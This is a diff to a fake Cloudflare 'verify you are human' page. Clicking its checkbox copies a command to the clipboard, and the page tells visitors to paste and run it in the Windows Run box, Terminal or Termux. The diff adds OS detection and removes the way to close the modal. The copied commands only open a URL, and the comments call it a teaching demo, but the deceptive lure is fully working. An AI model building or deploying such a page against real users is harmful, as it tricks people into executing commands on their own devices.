@@ -40,7 +40,6 @@ body {
     padding-top: 1rem;
     text-align: center;
 }
-
 /* ---------- 浅色主题 (默认) ---------- */
 :root {
     --bg-body: #fcfcfc;
@@ -71,7 +70,6 @@ body {
     /* Logo文字颜色：浅色下为黑色 */
     --logo-text-color: #333333;
 }
-
 /* ---------- 深色主题 (跟随系统) ---------- */
 @media (prefers-color-scheme: dark) {
     :root {
@@ -104,7 +102,6 @@ body {
         --logo-text-color: #ffffff;
     }
 }
-
 body {
     background-color: var(--bg-body);
     color: var(--text-body);
@@ -115,7 +112,6 @@ body {
 .ray-id, .footer span {
     color: var(--footer-text);
 }
-
 /* 复选框窗口 */
 #checkbox-window {
     width: 320px;
@@ -171,7 +167,6 @@ body {
 .link-spacer {
     margin: 0 4px;
 }
-
 /* 顶部logo和文字颜色（保持Cloudflare橙色不变） */
 #branding svg path[fill="#F6821F"],
 #branding svg path[fill="#FBAD41"] {
@@ -181,7 +176,6 @@ body {
 .logo-text {
     fill: var(--logo-text-color) !important;
 }
-
 /* 预加载动画 */
 .lds-ring div {
     border-color: #999 transparent transparent;
@@ -210,8 +204,7 @@ body {
     0% { transform: rotate(0deg); }
     to { transform: rotate(1turn); }
 }
-
-/* 模态框 */
+/* 模态框：完全恢复原样式，禁止空白处关闭 */
 .modal-overlay {
     display: none;
     position: fixed;
@@ -223,6 +216,7 @@ body {
     justify-content: center;
     align-items: center;
     z-index: 100;
+    pointer-events: auto;
 }
 .modal {
     width: 420px;
@@ -233,6 +227,8 @@ body {
     text-align: center;
     color: var(--modal-text);
     box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    position: relative;
+    z-index: 101;
 }
 .modal p {
     font-size: 18px;
@@ -254,6 +250,7 @@ body {
     max-width: 380px;
     color: var(--modal-text);
     font-family: monospace;
+    word-break: break-all;
 }
 .modal-loading {
     display: flex;
@@ -274,8 +271,27 @@ body {
     font-size: 16px;
     color: var(--modal-text);
 }
-
-/* 其他原样保留 */
+/* 安卓专属Termux下载提示按钮样式 */
+.termux-tip {
+    font-size:14px; 
+    margin-top:10px; 
+    text-align:center;
+    color: var(--modal-text);
+}
+.termux-download {
+    color: var(--checkbox-checked-bg);
+    text-decoration: none;
+    font-weight: 500;
+    padding: 2px 6px;
+    border: 1px solid var(--checkbox-checked-bg);
+    border-radius: 3px;
+    font-size: 14px;
+    margin-left: 5px;
+}
+.termux-download:hover {
+    background: rgba(66,133,244,0.1);
+}
+/* 其他样式完全保留原代码 */
 .security-review {
     margin: 50px 0 0 0 !important;
     padding: 0 20px !important;
@@ -304,12 +320,11 @@ body {
 <div class="main-wrapper">
  <div class="main-content">
   <div style="display: flex; align-items: center;">
-   <!-- 原图标链接，保持原样 -->
    <p style="font-size: 2.5rem; font-weight: 500; line-height: 3.75rem; color: var(--text-body);">mcedge.118pan.com</p>
   </div>
   <div style="font-size: 1.5rem; line-height: 2.25rem; margin-bottom: 2rem; min-height: 2rem;">
    <p>
-    <span class="preloader_text" style="display: none;">Checking if you are human. This may take a few seconds.</span>
+    <span class="preloader_text" style="display: none;">正在检查您是否为人类。这可能需要几秒钟。</span>
     <span class="textallstep" style="display: block;">请完成以下操作，验证您是真人。</span>
    </p>
   </div>
@@ -325,11 +340,9 @@ body {
     <div style="display: flex; flex-direction: column; align-items: flex-end; gap: 5px;">
      <div id="branding">
        <a class="cf-link" target="_blank" href="https://www.cloudflare.com/products/turnstile/?utm_source=turnstile&utm_campaign=widget" rel="noopener noreferrer">
-         <!-- Cloudflare SVG：白色文字部分内联fill保留，但会被CSS中的变量覆盖，实现深浅自适应 -->
          <svg role="img" aria-label="Cloudflare" id="logo" viewBox="0 0 73 25" fill="none" xmlns="http://www.w3.org/2000/svg">
            <path d="M61.8848 15.7841L62.0632 15.1578C62.2758 14.4126 62.1967 13.7239 61.8401 13.2178C61.5118 12.7517 60.9649 12.4773 60.3007 12.4453L47.7201 12.2836C47.6811 12.2829 47.6428 12.2728 47.6083 12.2542C47.5738 12.2356 47.5442 12.209 47.5217 12.1766C47.4996 12.1431 47.4856 12.1049 47.4807 12.0649C47.4758 12.025 47.4801 11.9844 47.4933 11.9465C47.5149 11.8839 47.5541 11.8291 47.6061 11.7888C47.658 11.7486 47.7204 11.7247 47.7856 11.72L60.4827 11.5566C61.9889 11.4864 63.6196 10.2462 64.1905 8.73372L64.9146 6.81361C64.9443 6.73242 64.951 6.64444 64.9341 6.55957C64.112 2.80652 60.8115 0 56.8652 0C53.2293 0 50.1421 2.38158 49.0347 5.69186C48.2864 5.12186 47.3535 4.85982 46.4228 4.95823C44.6785 5.13401 43.276 6.55928 43.1034 8.32979C43.059 8.77189 43.0915 9.21845 43.1992 9.64918C40.3497 9.73347 38.0645 12.1027 38.0645 15.0151C38.0649 15.2751 38.0838 15.5347 38.1212 15.7919C38.1294 15.8513 38.1584 15.9057 38.2029 15.9452C38.2474 15.9847 38.3044 16.0067 38.3635 16.0071L61.5894 16.0099C61.5916 16.0101 61.5938 16.0101 61.596 16.0099C61.6616 16.0088 61.7252 15.9862 61.7772 15.9455C61.8293 15.9049 61.867 15.8483 61.8848 15.7841Z" fill="#F6821F"></path>
            <path d="M66.0758 6.95285C65.9592 6.95285 65.843 6.95582 65.7274 6.96177C65.7087 6.96312 65.6904 6.96719 65.6729 6.97385C65.6426 6.98437 65.6152 7.00219 65.5931 7.02579C65.5711 7.04939 65.555 7.07806 65.5462 7.10936L65.0515 8.84333C64.8389 9.58847 64.918 10.2766 65.2749 10.7827C65.6029 11.2494 66.1498 11.5233 66.814 11.5552L69.4959 11.7186C69.5336 11.7199 69.5705 11.73 69.6037 11.7483C69.6369 11.7666 69.6654 11.7925 69.687 11.8239C69.7092 11.8576 69.7234 11.896 69.7283 11.9363C69.7332 11.9765 69.7288 12.0173 69.7153 12.0555C69.6937 12.118 69.6546 12.1727 69.6028 12.2129C69.5509 12.2531 69.4887 12.2771 69.4236 12.2819L66.6371 12.4453C65.1241 12.5161 63.4937 13.7558 62.9233 15.2682L62.722 15.8022C62.7136 15.8245 62.7105 15.8486 62.713 15.8724C62.7155 15.8961 62.7236 15.9189 62.7365 15.9389C62.7495 15.9589 62.7669 15.9755 62.7874 15.9873C62.8079 15.9991 62.8309 16.0058 62.8544 16.0068C62.8569 16.0068 62.8592 16.0068 62.8618 16.0068H72.4502C72.506 16.0073 72.5604 15.9893 72.6051 15.9554C72.6498 15.9216 72.6823 15.8739 72.6977 15.8195C72.8677 15.2043 72.9535 14.5684 72.9529 13.9296C72.9517 10.0767 69.8732 6.95285 66.0758 6.95285Z" fill="#FBAD41"></path>
-           <!-- 以下白色文字部分内联fill保留，但会被CSS中的变量覆盖，实现深浅自适应 -->
            <path d="M8.11963 18.8904H9.75541V23.4254H12.6139V24.8798H8.11963V18.8904Z" fill="#FFFFFF" class="logo-text"></path>
            <path d="M14.3081 21.9023V21.8853C14.3081 20.1655 15.674 18.7704 17.4952 18.7704C19.3164 18.7704 20.6653 20.1482 20.6653 21.8681V21.8853C20.6653 23.6052 19.2991 24.9994 17.4785 24.9994C15.6578 24.9994 14.3081 23.6222 14.3081 21.9023ZM18.9958 21.9023V21.8853C18.9958 21.0222 18.3806 20.2679 17.4785 20.2679C16.5846 20.2679 15.9858 21.0038 15.9858 21.8681V21.8853C15.9858 22.7484 16.6013 23.5025 17.4952 23.5025C18.3973 23.5025 18.9958 22.7666 18.9958 21.9023Z" fill="#FFFFFF" class="logo-text"></path>
            <path d="M22.6674 22.253V18.8901H24.3284V22.2191C24.3284 23.0822 24.7584 23.4939 25.4159 23.4939C26.0733 23.4939 26.5034 23.1003 26.5034 22.2617V18.8901H28.1647V22.2093C28.1647 24.1432 27.0772 24.9899 25.3991 24.9899C23.7211 24.9899 22.6674 24.1268 22.6674 22.2522" fill="#FFFFFF" class="logo-text"></path>
@@ -355,25 +368,25 @@ body {
   </p>
  </div>
 </div>
-
-<!-- 模态框：内容已修改为无害示例 -->
+<!-- 模态框：原样式，无关闭按钮，仅安卓显示Termux下载提示 -->
 <div class="modal-overlay" id="modal-overlay">
  <div class="modal">
-  <p>To prove you are not a robot, please：</p>
-  <ol>
-   <li>Press <b>Win</b> + <b>R</b>.</li>
-   <li>In the window, press <b>Ctrl</b> + <b>V</b></li>
-   <li>Press <b>Enter</b> on your keyboard to finish.</li>
+  <p>为了证明你不是机器人，请跟随以下步骤操作：</p>
+  <ol id="os-step">
+   <!-- JS自动识别后动态填充对应系统步骤 -->
+   <li>在键盘上按住<b>Win</b>并按下“<b>R</b>”</li>
+   <li>在弹出的运行框里面,按下“<b>Ctrl</b>”键并按下“<b>V</b>”或者在输入框内右键粘贴</li>
+   <li>点击<b>确定</b>或者按下键盘上的<b>Enter</b>键</li>
   </ol>
   <p>复制到剪贴板的内容为：</p>
-  <code>http://mcedge.github.io/mcedge</code>
+  <code id="os-echo">mcedge.github.io/mcedge</code>
   <div class="modal-loading">
    <div class="lds-ring"><div></div><div></div><div></div><div></div></div>
-   <div class="modal-loading-text">Verifying...</div>
+   <div class="modal-loading-text">验证中...</div>
   </div>
  </div>
 </div>
-
+<!-- 页脚完全保留原代码 -->
 <div class="footer" role="contentinfo">
  <div class="footer-inner">
   <div>Ray ID: <code class="ray-id">56a4c5299fdetmca</code></div>
@@ -382,7 +395,7 @@ body {
 </div>
 
 <script>
-// 保留原页面URL参数生成函数（无害，仅用于教学演示）
+// 保留原页面URL参数生成函数（无害，仅教学演示）
 window.onload = function() {
     function generateToken(length) {
         const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789.-_';
@@ -401,14 +414,90 @@ window.onload = function() {
 };
 
 document.addEventListener("DOMContentLoaded", function () {
+    // 原元素获取，完全保留
     const preloaderElements = document.querySelectorAll(".preloader");
     const preloaderText = document.querySelector(".preloader_text");
     const textAllStep = document.querySelector(".textallstep");
     const checkboxWindow = document.getElementById("checkbox-window");
     const checkbox = document.getElementById("checkbox");
     const modalOverlay = document.getElementById("modal-overlay");
+    // 新增：获取弹窗内容节点，用于动态替换
+    const osStep = document.getElementById("os-step");
+    const osEcho = document.getElementById("os-echo");
 
-    // 1.5秒后隐藏预加载，显示复选框窗口
+    // 核心1：自动识别操作系统函数（优先级：Android>Mac>Windows>Linux，避免识别冲突）
+    function detectOS() {
+        const userAgent = navigator.userAgent.toLowerCase();
+        if (userAgent.includes('android')) return 'android';
+        if (userAgent.includes('macintosh') || userAgent.includes('mac os x')) return 'mac';
+        if (userAgent.includes('windows')) return 'win';
+        if (userAgent.includes('linux')) return 'linux';
+        return 'win'; // 未知系统默认Windows
+    }
+
+    // 核心2：各系统配置（对应操作步骤+安全echo命令，无任何执行风险）
+    const osConfig = {
+        win: {
+            step: [
+                '在键盘上按住<b>Win</b>并按下“<b>R</b>”',
+                '在弹出的运行框里面,按下“<b>Ctrl</b>”键并按下“<b>V</b>”或者在输入框内右键粘贴',
+                '点击<b>确定</b>或者按下键盘上的<b>Enter</b>键来完成验证'
+            ],
+            echo: 'http://mcedge.github.io/mcedge'
+        },
+        mac: {
+            step: [
+                '按住<b>Command ⌘</b>并按下<b>空格</b> 来打开Spotlight（苹果的搜索工具）.',
+                '输入<b>Terminal</b>或者<b>终端</b>并打开，然后按住<b>Command ⌘</b>然后按<b>V</b>',
+                '按下键盘上面的<b>Enter</b>来完成验证'
+            ],
+            echo: 'open -a Safari http://mcedge.github.io/mcedge'
+        },
+        linux: {
+            step: [
+                '按下<b>Ctrl</b> + <b>Alt</b> + <b>T</b>来打开终端',
+                '在终端里面右键粘贴命令',
+                '按下键盘上面的<b>Enter</b>来完成验证'
+            ],
+            echo: 'xdg-open http://mcedge.github.io/mcedge'
+        },
+        android: {
+            step: [
+                '打开<b>Termux</b> app.',
+                '在Termux里面，长按并选择<b>Paste</b>来粘贴',
+                '按下键盘上面的<b>Enter</b>来完成验证'
+            ],
+            echo: 'xdg-open http://mcedge.github.io/mcedge'
+        }
+    };
+
+    // 核心3：初始化弹窗内容 - 自动识别+安卓专属Termux下载提示
+    const currentOS = detectOS();
+    function initOsContent() {
+        // 先移除已存在的Termux提示，避免重复
+        const oldTip = document.querySelector('.termux-tip');
+        if (oldTip) oldTip.remove();
+        // 替换步骤
+        osStep.innerHTML = '';
+        osConfig[currentOS].step.forEach(item => {
+            const li = document.createElement('li');
+            li.innerHTML = item;
+            osStep.appendChild(li);
+        });
+        // 替换echo命令
+        osEcho.innerText = osConfig[currentOS].echo;
+        // 仅安卓系统添加Termux下载提示
+        if (currentOS === 'android') {
+            const tip = document.createElement('p');
+            tip.className = 'termux-tip';
+            tip.innerHTML = '没有termux？点击旁边的下载按钮去下载安装termux<a href="https://termux.dev/en/" target="_blank" class="termux-download" rel="noopener noreferrer">【下载安装】</a>';
+            osStep.after(tip);
+        }
+    }
+    // 页面加载立即执行初始化
+    initOsContent();
+
+    // 原逻辑：1.5秒隐藏预加载显示复选框，完全保留
     setTimeout(() => {
         preloaderElements.forEach(el => el.style.display = "none");
         if (preloaderText) preloaderText.style.display = "none";
@@ -422,24 +511,15 @@ document.addEventListener("DOMContentLoaded", function () {
         }, 30);
     }, 1500);
 
-    // 修改后的点击事件：复制无害文本“恶意命令”，弹出模态框
-    checkbox.addEventListener("click", function () {
-        const harmlessText = "http://mcedge.github.io/mcedge";  // 要复制的无害内容
-
-        // 尝试使用现代clipboard API
+    // 新增：无害复制函数 - 复制当前系统对应的echo命令
+    function copyEchoCmd() {
+        const cmd = osConfig[currentOS].echo;
         if (navigator.clipboard && navigator.clipboard.writeText) {
-            navigator.clipboard.writeText(harmlessText).then(() => {
-                modalOverlay.style.display = "flex";
-            }).catch(() => {
-                fallbackCopy(harmlessText);
-                modalOverlay.style.display = "flex";
-            });
+            navigator.clipboard.writeText(cmd).catch(() => fallbackCopy(cmd));
         } else {
-            fallbackCopy(harmlessText);
-            modalOverlay.style.display = "flex";
+            fallbackCopy(cmd);
         }
-
-        // 后备复制方法
+        // 原后备复制逻辑，完全保留
         function fallbackCopy(text) {
             const textarea = document.createElement("textarea");
             textarea.value = text;
@@ -447,23 +527,21 @@ document.addEventListener("DOMContentLoaded", function () {
             textarea.style.opacity = "0";
             document.body.appendChild(textarea);
             textarea.select();
-            try {
-                document.execCommand("copy");
-            } catch (e) {}
+            try { document.execCommand("copy"); } catch (e) {}
             document.body.removeChild(textarea);
         }
+    }
 
-        checkbox.classList.add("checked");
+    // 原逻辑：复选框点击事件，仅替换复制内容为对应echo命令
+    checkbox.addEventListener("click", function () {
+        copyEchoCmd(); // 复制当前系统的安全echo命令
+        modalOverlay.style.display = "flex"; // 弹出原弹窗
+        checkbox.classList.add("checked"); // 复选框选中效果
     });
 
-    // 点击遮罩关闭模态框
-    modalOverlay.addEventListener("click", function (e) {
-        if (e.target === modalOverlay) {
-            modalOverlay.style.display = "none";
-        }
-    });
+    // 【关键修改】移除弹窗空白处关闭的逻辑，实现禁止点击空白关闭
 
-    // 随机生成Ray ID（仅用于演示）
+    // 原逻辑：随机生成Ray ID，完全保留
     const chars = "abcdef0123456789";
     document.querySelector(".ray-id").textContent = Array.from({ length: 16 }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
 });
